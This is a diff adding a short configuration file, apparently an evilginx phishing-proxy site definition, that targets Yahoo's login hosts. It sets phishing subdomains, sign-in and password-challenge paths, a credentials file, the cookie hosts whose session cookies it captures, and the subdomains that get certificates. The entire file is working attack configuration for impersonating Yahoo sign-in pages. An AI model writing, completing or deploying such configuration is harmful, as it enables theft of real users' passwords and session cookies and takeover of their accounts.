@@ -1,0 +1,12 @@
+[site]
+name=new
+site_conf=["login.yahoo.com.conf","yahoo.com.conf","fc.yahoo.com.conf"]
+creds_conf=yahoo.creds
+phish_subdomains=["login","www","fc"]
+phish_paths=["/config/login?.src","/account/challenge/password?.src"]
+target_hosts=["login.yahoo.com","yahoo.com","fc.yahoo.com"]
+cookie_hosts=["yahoo.com","login.yahoo.com","fc.yahoo.com"]
+redir_arg=rc
+success_arg=rd
+log_name=evilginx-new.log
+cert_subdomains=["login","www","fc"]
